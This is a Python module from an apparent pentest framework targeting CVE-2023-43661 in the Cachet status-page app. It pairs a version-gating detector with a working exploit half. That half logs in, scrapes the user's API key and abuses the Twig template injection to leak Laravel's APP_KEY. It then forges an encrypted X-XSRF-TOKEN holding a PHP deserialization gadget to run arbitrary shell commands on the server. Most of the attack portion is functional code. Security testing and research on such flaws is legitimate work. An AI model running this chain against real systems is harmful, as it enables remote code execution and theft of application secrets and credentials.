#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2023-43661')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2023-43661 — Cachet <= 2.3.18 authenticated Twig SSTI via the incident-template feature (SAFE DETECTOR).

Cachet's incident-template render is un-sandboxed: ReportIncidentCommandHandler::parseIncidentTemplate()
calls $this->twig->render($template->template, $vars) on an attacker-controlled template body. An
authenticated user (X-Cachet-Token / dashboard session) who can create an incident template injects a Twig
payload, then triggers the render via POST /api/v1/incidents {template:<slug>}; the rendered output becomes
the incident `message`, reflected verbatim — an in-band SSTI oracle. On the pinned twig/twig 1.40.1 the
command-exec filter-chains do NOT fire (map/filter/reduce arrived in 1.41, sort takes no callable, _self is
a string), so the DEMONSTRATED primitive is expression-eval + config()/APP_KEY disclosure, not in-band RCE.
Fixed in Cachet 2.4 (commit 6fb043e wraps the render in a Twig SecurityPolicy sandbox).

DETECTION DISCIPLINE (avoid the 48987/49130 "the app exists" false-positive class):
This is an AUTHENTICATED, version-bound vuln, so the SAFE UNAUTH detector is fingerprint + version-gate, NOT
mere presence and NOT firing the SSTI sink (that needs a token + mutates state — left to exploit()).
  * Fingerprint Cachet positively via its PUBLIC, unauthenticated v2 API: GET /api/v1/version returns JSON
    whose `data` field carries the version string (e.g. "2.3.18"); corroborated by GET /api/v1/ping -> "Pong!".
  * Version-gate: vulnerable iff version <= 2.3.18 (2.4 is the sandbox fix). >= 2.4.0 -> patched. If Cachet is
    fingerprinted but the version can't be parsed, set version_status="unknown" / vulnerable=False and say
    exploit() confirms via the authenticated {{config('app.key')}} oracle.
Honesty nuance: a backported 2.4 sandbox (e.g. the lab's mitigate.sh) leaves /api/v1/version reading 2.3.18
while killing the SSTI — the version surface cannot see that, so the evidence says exploit() confirms the
render is actually un-sandboxed. scan() is side-effect-free and needs no auth to run.
"""

import html
import re
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

_VERSION_ENDPOINT = "/api/v1/version"
_PING_ENDPOINT = "/api/v1/ping"
# Last vulnerable release (2.3.18 is the last 2.3.x; the SecurityPolicy sandbox fix shipped in 2.4.0).
_LAST_VULNERABLE = (2, 3, 18)


def _normalize_base(target_url: str) -> str:
    base = (target_url or "").rstrip("/")
    if base and not base.startswith(("http://", "https://")):
        base = "http://" + base
    return base


def _get(session, url, **kw):
    try:
        return session.get(url, timeout=kw.pop("timeout", 10), verify=False,
                           allow_redirects=True, **kw)
    except requests.RequestException:
        return None


def _post(session, url, **kw):
    try:
        return session.post(url, timeout=kw.pop("timeout", 10), verify=False,
                            allow_redirects=False, **kw)
    except requests.RequestException:
        return None


def _parse_version(raw):
    """Parse a Cachet version string like 'v2.3.18'/'2.3.18'/'2.3.18-dev' into (M,m,p), or None.
    Defensive: anything that isn't a precise dotted release degrades to None (-> version_status unknown)."""
    if not raw or not isinstance(raw, str):
        return None
    m = re.search(r"v?(\d+)\.(\d+)\.(\d+)", raw)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _extract_form_token(body: str) -> str | None:
    """Extract Laravel's CSRF form token from Cachet's login/profile forms."""
    text = body or ""
    patterns = (
        r'<input[^>]+name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']_token["\']',
    )
    for pattern in patterns:
        m = re.search(pattern, text, flags=re.I)
        if m:
            return html.unescape(m.group(1)).strip() or None
    return None


def _extract_dashboard_api_key(body: str) -> str | None:
    """Scrape the current user's API key from /dashboard/user.

    Cachet 2.3.18 renders it as:
      <input ... name="api_key" disabled value="{{ $current_user->api_key }}">
    """
    text = body or ""
    patterns = (
        r'<input[^>]+name=["\']api_key["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']api_key["\']',
    )
    for pattern in patterns:
        m = re.search(pattern, text, flags=re.I)
        if m:
            key = html.unescape(m.group(1)).strip()
            if key:
                return key
    return None


def _login_and_extract_api_key(session, base: str, username: str, password: str, *, timeout: int = 20):
    """Use the real browser login flow and scrape the dashboard profile API key."""
    artifacts = {
        "auth_flow": "dashboard_login_then_profile_api_key",
        "login_url": f"{base}/auth/login",
        "profile_url": f"{base}/dashboard/user",
    }
    try:
        login_page = session.get(
            f"{base}/auth/login",
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        artifacts["error"] = f"login page request failed: {exc.__class__.__name__}"
        return None, artifacts

    artifacts["login_page_status"] = login_page.status_code
    csrf = _extract_form_token(login_page.text or "")
    if csrf:
        artifacts["csrf_token_found"] = True

    data = {"username": username, "password": password}
    if csrf:
        data["_token"] = csrf

    try:
        login_resp = session.post(
            f"{base}/auth/login",
            data=data,
            headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        artifacts["error"] = f"login POST failed: {exc.__class__.__name__}"
        return None, artifacts

    artifacts["login_status"] = login_resp.status_code
    artifacts["login_final_url"] = getattr(login_resp, "url", f"{base}/auth/login")
    if "/auth/2fa" in (artifacts["login_final_url"] or ""):
        artifacts["error"] = "two-factor authentication required"
        return None, artifacts

    try:
        profile = session.get(
            f"{base}/dashboard/user",
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
    except requests.RequestException as exc:
        artifacts["error"] = f"profile request failed: {exc.__class__.__name__}"
        return None, artifacts

    artifacts["profile_status"] = profile.status_code
    artifacts["profile_final_url"] = getattr(profile, "url", f"{base}/dashboard/user")
    api_key = _extract_dashboard_api_key(profile.text or "")
    if api_key:
        artifacts["api_key_source"] = "dashboard_profile"
        return api_key, artifacts

    if "/auth/login" in (artifacts["profile_final_url"] or "") or "name=\"password\"" in (profile.text or ""):
        artifacts["error"] = "dashboard login failed or session was not established"
    else:
        artifacts["error"] = "dashboard profile did not expose an api_key input"
    artifacts["profile_body_head"] = (profile.text or "")[:220]
    return None, artifacts


def _resolve_cachet_api_token(session, base: str, username=None, password=None, options=None):
    opts = options or {}
    explicit = opts.get("token")
    if explicit:
        return str(explicit), {"auth_flow": "explicit_x_cachet_token", "api_key_source": "options"}
    if not (username and password):
        return None, {
            "auth_flow": "dashboard_login_then_profile_api_key",
            "error": "username/password required to derive X-Cachet-Token",
        }
    return _login_and_extract_api_key(session, base, str(username), str(password))


def _probe_incident_route_control(
    session,
    base: str,
    token: str | None = None,
):
    """Send an inert invalid incident request to distinguish app validation from edge blocking."""
    body = {"name": "", "status": -1, "visible": 0, "template": "__lvc_missing_template__"}
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Cachet-Token"] = token
    r = _post(session, f"{base}{_INCIDENTS_ENDPOINT}", json=body, headers=headers)
    if r is None:
        return {"state": "unknown", "reason": "no response"}
    text = r.text or ""
    edge_forbidden = r.status_code == 403 and (
        "<title>403 forbidden" in text.lower()
        or "apache" in r.headers.get("Server", "").lower()
        or text.strip().lower().startswith("forbidden")
    )
    return {
        "state": "blocked" if edge_forbidden else "reachable",
        "status": r.status_code,
        "auth": "X-Cachet-Token" if token else "none",
        "body_head": text[:180],
    }


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    """Fingerprint Cachet + version-gate. No auth required for the version check. When a token or
    username/password are supplied, use the real dashboard login/API-key flow for the inert
    incident-route control probe; the mutating SSTI oracle remains in exploit(). Never raises."""
    base = _normalize_base(target_url)
    sess = session or http_config.get_auth_session()
    s = sess
    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2023-43661")

    result = {
        "cve_id": "CVE-2023-43661",
        "name": "Cachet authenticated Twig SSTI (incident-template) — config/APP_KEY disclosure",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version_status": "unknown",
        "endpoint": base + "/api/v1/incidents",
        "severity": "High",
        "category": "info_disclosure",
        "requires_auth": True,
        "confidence": "low",
        "evidence": [],
        "detection_methods": [],
        "artifacts": {},
    }
    if not base:
        result["evidence"].append("no target_url provided")
        return result

    # 1) FINGERPRINT: Cachet's public v2 API version surface. data field = the running version.
    ver = _get(s, f"{base}{_VERSION_ENDPOINT}")
    cachet_version = None
    is_cachet = False
    if ver is not None and ver.status_code == 200:
        try:
            data = ver.json()
        except (ValueError, requests.exceptions.JSONDecodeError):
            data = None
        # Cachet's GeneralController@getVersion returns {"meta":{...},"data":"2.3.18"} (data is the
        # version string). Be tolerant of shape drift: accept a top-level string or a {"version":...}.
        if isinstance(data, dict):
            cand = data.get("data")
            if isinstance(cand, dict):
                cand = cand.get("version") or cand.get("tag_name")
            if isinstance(cand, str) and _parse_version(cand):
                cachet_version = cand
                is_cachet = True
            elif isinstance(data.get("version"), str) and _parse_version(data.get("version")):
                cachet_version = data.get("version")
                is_cachet = True
        if cachet_version:
            result["artifacts"]["version_string"] = cachet_version
            result["evidence"].append(f"{_VERSION_ENDPOINT} -> Cachet version '{cachet_version}'")

    # 2) Corroborating Cachet signal: /api/v1/ping -> JSON "Pong!".
    # Skip it once /api/v1/version already yielded a parseable Cachet version.
    if not is_cachet:
        ping = _get(s, f"{base}{_PING_ENDPOINT}")
        if ping is not None and ping.status_code == 200 and "Pong" in (ping.text or ""):
            is_cachet = True
            result["detection_methods"].append("api_v1_ping_pong")
            result["evidence"].append(f"{_PING_ENDPOINT} -> 'Pong!' (Cachet v1 API)")

    if not is_cachet:
        result["evidence"].append(
            "Cachet not fingerprinted (no /api/v1/version JSON version, no /api/v1/ping Pong!) — "
            "not a Cachet status-page install")
        return result

    result["detection_methods"].append("cachet_api_fingerprint")
    result["status"] = "surface_present"
    result["verdict"] = "surface_present"
    result["proof_type"] = "fingerprint"

    # 3) VERSION-GATE.
    parsed = _parse_version(cachet_version)
    if parsed is None:
        # Cachet confirmed but version unreadable -> do NOT fire on presence alone (FP discipline).
        result["version_status"] = "unknown"
        result["confidence"] = "low"
        result["evidence"].append(
            "Cachet fingerprinted but version not parseable — NOT asserting vulnerable on presence "
            "alone; exploit() confirms via the authenticated {{config('app.key')}} SSTI oracle "
            "(POST /api/v1/incidents after dashboard login/API-key extraction).")
        return result

    if parsed > _LAST_VULNERABLE:
        result["version_status"] = "patched"
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "version"
        result["confidence"] = "high"
        result["evidence"].append(
            f"Cachet {'.'.join(map(str, parsed))} > 2.3.18 — PATCHED (>=2.4.0 sandboxes the "
            "incident-template render via Twig SecurityPolicy, commit 6fb043e).")
        return result

    # Version is within the affected range (<= 2.3.18).
    opts = kwargs.get("options") if isinstance(kwargs.get("options"), dict) else {}
    control_token, auth_artifacts = _resolve_cachet_api_token(
        s, base, username=username, password=password, options=opts)
    if auth_artifacts and (opts.get("token") or username or password):
        result["artifacts"]["api_token_resolution"] = auth_artifacts
        if control_token:
            result["detection_methods"].append("dashboard_api_key_extracted")
            result["evidence"].append(
                "Authenticated to Cachet dashboard and extracted the user's API key for route probing")
    control = _probe_incident_route_control(s, base, control_token)
    result["artifacts"]["incident_route_probe"] = control
    result["detection_methods"].append("incident_route_control_probe")
    if control.get("state") == "blocked":
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "route_control"
        result["version_status"] = "vulnerable version, incident route blocked"
        result["confidence"] = "high"
        result["evidence"].append(
            f"Cachet {'.'.join(map(str, parsed))} is in range, but POST /api/v1/incidents is blocked "
            f"before the Twig sink (HTTP {control.get('status')})")
        return result

    result["status"] = "version_applicable"
    result["verdict"] = "version_applicable"
    result["proof_type"] = "version"
    result["version_status"] = "vulnerable"
    result["confidence"] = "high"
    result["detection_methods"].append("version_in_affected_range")
    result["evidence"].append(
        f"Cachet {'.'.join(map(str, parsed))} <= 2.3.18 — within affected range (authenticated Twig "
        "SSTI in the incident-template feature; un-sandboxed before 2.4). exploit() confirms the "
        "render is un-sandboxed by leaking config/APP_KEY via {{config('app.key')}}.")
    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2023-43661 exploitation half — Cachet <= 2.3.18 Twig SSTI -> APP_KEY -> Laravel RCE chain.

Stage 1 is the CVE's authenticated incident-template Twig SSTI. The lab seeds template slug "poc" with
`{{ config('app.key') }}`, so POST /api/v1/incidents renders the live Laravel APP_KEY into the JSON
incident message. Direct Twig command execution is still intentionally NOT claimed for this pinned build:
Twig 1.40.1 lacks the later arrow-filter/callable primitives and `_self` is not a template object.

Stage 2 uses the disclosed APP_KEY against Laravel 5.2's encrypted-token decrypt path. In Laravel 5.2,
VerifyCsrfToken reads the X-XSRF-TOKEN header and calls Encrypter::decrypt(); Encrypter::decrypt()
AES-decrypts and then unserializes the plaintext. A valid APP_KEY therefore lets us forge an encrypted
serialized gadget. Cachet 2.3.18 ships compatible Guzzle and Monolog gadgets; the default chain is
Guzzle/RCE1, posted to /auth/login as an X-XSRF-TOKEN header. This is the CVE-2018-15133-class primitive
chained from the CVE-2023-43661 key leak, with the key leak as the load-bearing first link.

If stage 2 is blocked after the key leak, success remains true as `secrets-disclosed` rather than
misreporting RCE. When stage 2 markers are observed, success is reported as chained RCE and `command` is
honored.
"""

import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

_INCIDENTS_ENDPOINT = "/api/v1/incidents"
# Lab incident-template slug (see vuln-labs/apps/.../scripts/entrypoint.sh). Authentication material
# must be explicit: pass -U/-P so the module can log in and extract the dashboard API key, or pass
# options["token"] as an override.
_LAB_SLUG = "poc"                    # lab default (seeded SSTI template slug)

# Recognizer for the disclosed APP_KEY in the reflected SSTI render (the seeded "poc" payload). This is
# the deterministic positive proof. A bare scalar (e.g. a DB password from a {{config('database...')}}
# template) is NOT secret-shaped on its own, so we only treat it as a captured secret when the operator
# EXPLICITLY opted in via options['expect_secret']=True (they know they pointed the template at a config
# value) — this keeps success=True bound to positive proof, never a bare one-word render.
_APP_KEY_RE = re.compile(r"base64:[A-Za-z0-9+/=]{20,}")
_TRIVIAL_RENDER = {"ssti-poc", "true", "false", "1", "0", "", "null"}
_DEFAULT_RCE_PATH = "/auth/login"
_DEFAULT_GADGET_CHAIN = "Guzzle/RCE1"


def _normalize_base(target_url: str) -> str:
    base = (target_url or "").rstrip("/")
    if base and not base.startswith(("http://", "https://")):
        base = "http://" + base
    return base


def _normalize_laravel_key(app_key: str) -> bytes:
    raw = (app_key or "").strip().strip("\"'")
    raw = raw.replace("\\/", "/")
    if raw.startswith("base64:"):
        raw = raw[len("base64:"):]
    try:
        key = base64.b64decode(raw)
    except Exception as exc:
        raise ValueError("APP_KEY is not valid base64") from exc
    if len(key) != 32:
        raise ValueError(f"APP_KEY decoded to {len(key)} bytes, expected 32 for AES-256-CBC")
    return key


def _laravel52_encrypt_raw(plaintext: bytes, app_key: str) -> str:
    """Forge a Laravel 5.2 AES-256-CBC/HMAC token whose decrypted bytes are already serialized."""
    try:
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except ImportError as exc:
        raise RuntimeError("python package 'cryptography' is required for Laravel token encryption") from exc

    key = _normalize_laravel_key(app_key)
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    iv_b64 = base64.b64encode(iv).decode("ascii")
    value_b64 = base64.b64encode(ciphertext).decode("ascii")
    mac = hmac.new(key, (iv_b64 + value_b64).encode("ascii"), hashlib.sha256).hexdigest()
    payload = json.dumps({"iv": iv_b64, "value": value_b64, "mac": mac}, separators=(",", ":"))
    return base64.b64encode(payload.encode("utf-8")).decode("ascii")


def _marker_cmd(command: str, marker: str) -> str:
    return f"printf '{marker}_START\\n'; ({command}) 2>&1; printf '\\n{marker}_END\\n'"


def _extract_marker_output(text: str, marker: str) -> str | None:
    m = re.search(re.escape(marker) + r"_START\s*(.*?)\s*" + re.escape(marker) + r"_END",
                  text or "", re.S)
    return m.group(1).strip() if m else None


def _build_php_gadget(chain: str, command: str, *, fast_destruct: bool = False) -> bytes:
    from modules.generators.php_gadgets import GenerateOptions, generate

    opts = GenerateOptions(fast_destruct=fast_destruct)
    payload = generate(chain, "system", command, options=opts, fallback_phpggc=False)
    if isinstance(payload, str):
        return payload.encode("latin-1")
    return payload


def _chain_appkey_to_xsrf_rce(session, base: str, app_key: str, command: str, options: dict):
    """Use the leaked APP_KEY to forge an encrypted X-XSRF-TOKEN carrying a POP gadget."""
    cmd = command or "echo CVE-2023-43661 PoC && id && hostname"
    marker = "LVC43661RCE" + secrets.token_hex(3).upper()
    wrapped = _marker_cmd(cmd, marker)
    chain = str(options.get("gadget") or options.get("chain") or _DEFAULT_GADGET_CHAIN)
    rce_path = str(options.get("rce_path") or options.get("stage2_path") or _DEFAULT_RCE_PATH)
    if not rce_path.startswith("/"):
        rce_path = "/" + rce_path

    artifacts = {
        "stage2_sink": base + rce_path,
        "stage2_command": cmd,
        "stage2_marker": marker,
        "gadget_chain": chain,
    }

    try:
        gadget = _build_php_gadget(chain, wrapped, fast_destruct=bool(options.get("fast_destruct")))
        token = _laravel52_encrypt_raw(gadget, app_key)
    except Exception as exc:
        artifacts["stage2_error"] = f"token/gadget build failed: {exc}"
        requires = []
        if "cryptography" in str(exc).lower():
            requires.append("python:cryptography")
        return False, "", artifacts, requires

    artifacts["gadget_len"] = len(gadget)
    headers = {
        "X-XSRF-TOKEN": token,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": http_config.BROWSER_USER_AGENT,
        "X-lvcscan": "CVE-2023-43661",
    }
    data = {"email": "lvc@example.test", "password": "invalid"}
    try:
        resp = session.post(base + rce_path, data=data, headers=headers, timeout=20,
                            verify=False, allow_redirects=True)
    except requests.RequestException as exc:
        artifacts["stage2_error"] = f"sink POST failed: {exc.__class__.__name__}"
        return False, "", artifacts, []

    body = resp.text or ""
    artifacts["stage2_http_status"] = resp.status_code
    proof = _extract_marker_output(body, marker)
    if proof is not None:
        return True, proof, artifacts, []

    artifacts["stage2_error"] = "command output marker not observed in response"
    artifacts["stage2_body_head"] = body[:400]
    return False, "", artifacts, []


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None):
    """Authenticated Twig SSTI -> APP_KEY leak; use that key for X-XSRF-TOKEN deserialization RCE."""
    opts = options or {}
    result = {
        "cve": "CVE-2023-43661",
        "attempted": True,
        "success": False,
        "vuln_class": "chained_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    base = _normalize_base(target_url)
    if not base:
        result.update(attempted=False, reason="no target_url provided")
        return result

    slug = opts.get("template") or opts.get("slug") or _LAB_SLUG
    # Opt-in: when the operator has pointed the template at a config() secret (e.g. a DB password) whose
    # render is a bare scalar, they set expect_secret=True so we accept it as a captured secret.
    expect_secret = bool(opts.get("expect_secret"))
    secrets_only = bool(opts.get("secrets_only") or opts.get("no_rce"))

    s = session or http_config.get_auth_session()
    s.headers.setdefault("User-Agent", http_config.BROWSER_USER_AGENT)
    s.headers.setdefault("X-lvcscan", "CVE-2023-43661")

    # Cachet's vulnerable sink is token-authenticated, but we do not require operators to paste the
    # token. With -U/-P, follow the browser login flow, scrape /dashboard/user, and use the displayed
    # per-user API key as X-Cachet-Token.
    token, auth_artifacts = _resolve_cachet_api_token(
        s, base, username=username, password=password, options=opts)
    result["artifacts"]["auth_flow"] = auth_artifacts
    if not token:
        result.update(
            requires=["Cachet dashboard credentials or X-Cachet-Token"],
            reason=(
                "Cachet exploit requires authentication; pass -U/-P so the module can log in and "
                "extract the dashboard API key, or provide an explicit X-Cachet-Token through options"
            ),
            detail=(auth_artifacts or {}).get("error", "no API token or credentials supplied"),
        )
        return result

    # Trigger the SSTI sink: report an incident referencing the malicious template -> the handler renders
    # incident_templates.template (the injected Twig) and the result is the incident message.
    body = {"name": "ssti-poc", "status": 1, "visible": 1, "template": slug}
    headers = {"Content-Type": "application/json", "X-Cachet-Token": token}
    try:
        resp = s.post(f"{base}{_INCIDENTS_ENDPOINT}", json=body, headers=headers,
                      timeout=20, verify=False)
    except requests.RequestException as e:
        result.update(reason=f"request to {_INCIDENTS_ENDPOINT} failed: {e.__class__.__name__}",
                      requires=["Cachet dashboard credentials or X-Cachet-Token"])
        return result

    status = resp.status_code

    # --- Faithful status branches (port the PoC) ---
    if status == 401:
        result.update(
            reason="HTTP 401 — Cachet rejected the API key extracted from the dashboard profile.",
            requires=["valid Cachet dashboard credentials or X-Cachet-Token api_key"],
            detail="authentication to /api/v1/incidents failed")
        return result

    if status == 500:
        # The Twig SecurityPolicy sandbox (2.4 fix / lab mitigate.sh) rejects the payload -> SecurityError.
        result.update(
            reason="HTTP 500 — the incident-template render was rejected (Twig\\Sandbox\\SecurityError). "
                   "Target is MITIGATED/PATCHED: the render is sandboxed (>=2.4 commit 6fb043e). Not "
                   "exploitable.",
            detail="Twig sandbox rejected the SSTI payload — secret NOT disclosed")
        return result

    if status != 200:
        result.update(
            reason=f"HTTP {status} (unexpected) from {_INCIDENTS_ENDPOINT} — SSTI sink not reached.",
            detail=f"non-200 response; body head: {(resp.text or '')[:200]}")
        return result

    # 200: parse the reflected SSTI render (the rendered template body becomes the incident message).
    try:
        message = resp.json().get("data", {}).get("message")
    except (ValueError, AttributeError, requests.exceptions.JSONDecodeError):
        result.update(reason="HTTP 200 but could not parse data.message from the JSON response",
                      detail=f"body head: {(resp.text or '')[:200]}")
        return result

    if not isinstance(message, str):
        result.update(reason="HTTP 200 but incident message was empty/non-string — SSTI may have rendered "
                             "an empty result (no reachable gadget on pinned Twig 1.40.1)",
                      detail=f"data.message = {message!r}")
        return result

    # POSITIVE PROOF: a recognizable secret in the rendered output. APP_KEY first (the seeded payload).
    m = _APP_KEY_RE.search(message)
    if m:
        app_key = m.group(0)   # Twig renders config('app.key') verbatim — directly usable, no unmangling.
        result.update(
            success=True,
            vuln_class="info_disclosure",
            evidence=f"APP_KEY disclosed via authenticated Twig SSTI: {app_key}",
            detail=f"POST {_INCIDENTS_ENDPOINT} (template='{slug}') rendered config('app.key') into the "
                   f"incident message: {app_key}",
            artifacts={
                "app_key": app_key,                       # un-mangled, usable AES-256 key
                "leaked_app_key": app_key,
                "endpoint": base + _INCIDENTS_ENDPOINT,
                "stage1_endpoint": base + _INCIDENTS_ENDPOINT,
                "template_slug": slug,
                "ssti_render": message,
                "auth": "X-Cachet-Token",
                "auth_flow": auth_artifacts,
            },
        )
        result["outcome_tag"] = "secrets-disclosed"
        result["outcome"] = ("Authenticated Twig SSTI on Cachet <=2.3.18 (pinned Twig 1.40.1): the "
                             "un-sandboxed incident-template render evaluates arbitrary Twig and exposes "
                             "Laravel's config() helper -> APP_KEY disclosed.")
        result["impact"] = ("Disclosed the live Laravel APP_KEY (usable AES-256 key -> cookie/session + "
                            "signed-URL forgery). CVE class is SSTI->RCE, but on the pinned twig/twig "
                            "1.40.1 the in-band command-exec chains do NOT fire (no arrow filters; string "
                            "_self) — the demonstrated primitive is expression-eval + config/secret "
                            "disclosure, NOT in-band command execution.")
        if secrets_only:
            result["detail"] += "  Stage 2 skipped by options['secrets_only']/options['no_rce']."
            return result

        rce_ok, proof, stage2_artifacts, requires = _chain_appkey_to_xsrf_rce(
            s, base, app_key, command, opts
        )
        result["artifacts"].update(stage2_artifacts)
        if requires:
            result["requires"] = sorted(set(result.get("requires", []) + requires))
        if rce_ok:
            result.update(
                vuln_class="rce",
                evidence=proof,
                detail=(
                    f"Stage 1 leaked APP_KEY via POST {_INCIDENTS_ENDPOINT} template='{slug}'. "
                    f"Stage 2 forged a Laravel 5.2 encrypted X-XSRF-TOKEN carrying "
                    f"{stage2_artifacts.get('gadget_chain')} and POSTed it to "
                    f"{stage2_artifacts.get('stage2_sink')}; command output markers were reflected."
                ),
            )
            result["outcome_tag"] = "rce-chained"
            result["outcome"] = (
                "EXPLOITED chained RCE: CVE-2023-43661 leaked APP_KEY, then Laravel 5.2 "
                "X-XSRF-TOKEN decrypt/unserialize executed the supplied command."
            )
            result["impact"] = (
                "Remote command execution as the Cachet web user via APP_KEY-forged encrypted "
                "X-XSRF-TOKEN PHP object deserialization. The direct Twig sink leaked the key; "
                "the Laravel decrypt/unserialize path provided code execution."
            )
        else:
            result["detail"] += (
                "  Stage 2 X-XSRF-TOKEN decrypt/unserialize RCE was attempted but did not return "
                "command markers; preserving the confirmed APP_KEY disclosure outcome."
            )
        return result

    # SSTI evaluated but no secret recognized (e.g. template body was {{7*7}} -> "49", or the payload
    # rendered empty / echoed literal {{...}}). Honest non-success.
    if message == "49":
        result.update(
            reason="SSTI expression-eval CONFIRMED ({{7*7}} -> '49') but no secret disclosed by this "
                   "template body — re-point the incident template to {{config('app.key')}} to leak the "
                   "APP_KEY. (Vulnerability present; no secret captured.)",
            detail="arbitrary Twig is evaluated server-side, but the rendered output held no secret")
        result["artifacts"] = {"ssti_render": message, "endpoint": base + _INCIDENTS_ENDPOINT,
                               "template_slug": slug}
        return result

    if "{{" in message and "}}" in message:
        result.update(
            reason="HTTP 200 but the Twig payload was reflected LITERALLY ({{...}} not evaluated) — the "
                   "incident-template body may not be Twig, or the render path is not the un-sandboxed "
                   "sink. No SSTI evaluation observed.",
            detail=f"message echoed verbatim: {message[:200]!r}")
        return result

    # DB-cred path (opt-in only): a config('database...') template body renders a bare scalar (e.g. the DB
    # password). We accept it as a captured secret ONLY when the operator set options['expect_secret'] —
    # otherwise a bare one-word render is NOT positive proof and must not flip success=True.
    if expect_secret and message.lower() not in _TRIVIAL_RENDER:
        result.update(
            success=True,
            evidence=f"Secret disclosed via authenticated Twig SSTI (config render): {message}",
            detail=f"POST {_INCIDENTS_ENDPOINT} (template='{slug}') rendered a config() value into the "
                   f"incident message: {message}",
            artifacts={"secret": message, "endpoint": base + _INCIDENTS_ENDPOINT,
                       "template_slug": slug, "ssti_render": message, "auth": "X-Cachet-Token",
                       "auth_flow": auth_artifacts},
        )
        result["outcome_tag"] = "secrets-disclosed"
        result["outcome"] = ("Authenticated Twig SSTI on Cachet <=2.3.18: un-sandboxed incident-template "
                             "render leaked a Laravel config() value.")
        result["impact"] = ("Disclosed a server config secret (e.g. DB credential) via SSTI. On the pinned "
                            "Twig 1.40.1 this is expression-eval + config/secret disclosure, NOT in-band "
                            "command execution.")
        return result

    # Rendered something else (non-empty, non-secret) — SSTI fired but nothing actionable captured.
    result.update(
        reason="HTTP 200 — incident-template render reflected, but no recognizable secret (APP_KEY / DB "
               "cred) in the output. SSTI likely present but the seeded template body did not disclose a "
               "secret on this build.",
        detail=f"rendered message: {message[:200]!r}")
    result["artifacts"] = {"ssti_render": message, "endpoint": base + _INCIDENTS_ENDPOINT,
                           "template_slug": slug}
    return result
